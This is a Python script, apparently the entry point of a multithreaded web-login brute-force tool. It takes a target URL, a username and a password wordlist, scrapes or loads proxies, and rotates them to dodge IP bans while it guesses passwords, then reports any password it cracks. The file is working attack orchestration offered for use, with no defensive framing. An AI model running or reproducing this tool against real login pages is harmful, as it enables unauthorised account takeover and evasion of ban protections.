import threading
import argparse
import time

import misc
from scrape_online_proxies import proxy_listen_dot_de
from queue_list_functions import *
import bruteforcer
import proxy
from usernamePassParameter import UsernamePassParameter


def args_setup():
    parser = argparse.ArgumentParser(description='Threaded Proxy Web login brute-force attack')
    parser.add_argument('-t', '--target', required=True,
                        help='specify target webpage')
    parser.add_argument('-u', '--username', required=True,
                        help='specify username to brute-force')
    parser.add_argument('-b', '--bad-response-text', required=True,
                        help='specify text in server response of failed login')
    parser.add_argument('-i', '--banned-ip-keyword', required=True,
                        help='specify text in server response of banned IP')
    parser.add_argument('-f', '--password-list', required=True, type=argparse.FileType('r'),
                        help='specify password word-list file')
    parser.add_argument('-m', '--http-method', default='post', choices=['get', 'post'],
                        help='specify http request method; either GET / POST')
    parser.add_argument('-p', '--proxy-list', required=False, type=argparse.FileType('r'),
                        help='proxy-list file. If not specified, proxies are found during runtime')
    parser.add_argument('--thread-count', type=int, default=4,
                        help='number of concurrent brute-forcing threads. default=4')
    return parser.parse_args()


def main():
    args = args_setup()

    if args.proxy_list:
        proxy_obj_list = proxy.parse_proxy_list_from_file(args.proxy_list)
    else:
        proxy_obj_list = proxy_listen_dot_de.scrape(get_global_proxy_type_list=True)
    proxies_q = list_to_queue(proxy_obj_list)

    thread_list = []
    stop_event = threading.Event()
    invalid_proxy_list = []

    if args.http_method is 'post':
        is_post_req = True
    else:
        is_post_req = False

    password_q = list_to_queue(generate_list_from_file(args.password_list))
    found_password_q = Queue()
    tried_password_counter = misc.AtomicCounter()

    start_time = time.time()
    misc.print_stat('starting brute-force login attack', 'magenta')

    for i in range(args.thread_count):
        w = bruteforcer.Worker(name="w" + str(i),
                               stop_event=stop_event,
                               proxy_q=proxies_q,
                               invalid_proxy_lst=invalid_proxy_list,
                               url=args.target,
                               username_pswd_param=UsernamePassParameter('username',
                                                                         'password',
                                                                         username_to_try=args.username),
                               bad_password_resp_keyword=args.bad_response_text,
                               banned_ip_resp_keyword=args.banned_ip_keyword,
                               password_queue=password_q,
                               found_password_q=found_password_q,
                               tried_password_counter=tried_password_counter,
                               is_post_req=is_post_req)
        thread_list.append(w)
        w.start()

    try:
        while True:
            if misc.all_threads_still_running(thread_list):
                time.sleep(5)
                misc.print_stat('{} passwords tried so far in {:.0f} seconds'.format(
                    tried_password_counter.value, time.time()-start_time), 'magenta')
            else:
                break
    except KeyboardInterrupt:
        misc.print_stat('closing...', 'magenta')
        stop_event.set()  # signal to stop threads if cntrl-c caught

    for t in thread_list:
        t.join()

    if found_password_q.qsize() > 0:
        try:
            username, password = found_password_q.get(block=False)
            misc.print_positive('password: "{}" found for username: "{}"'.format(password, username))
        except:
            misc.print_error('error retrieving password from password_queue in main thread')
    else:
        misc.print_error('password was not found')
    misc.print_stat('total runtime: {:.0f} seconds '.format(time.time() - start_time))

    dead_proxy_file_name = '../data/dead_proxies.txt'
    with open(dead_proxy_file_name, 'w') as f:
        for p in invalid_proxy_list:
            f.write('{}\n'.format(p))
    misc.print_stat('list of dead proxies output to: {}'.format(dead_proxy_file_name))


if __name__ == '__main__':
    main()
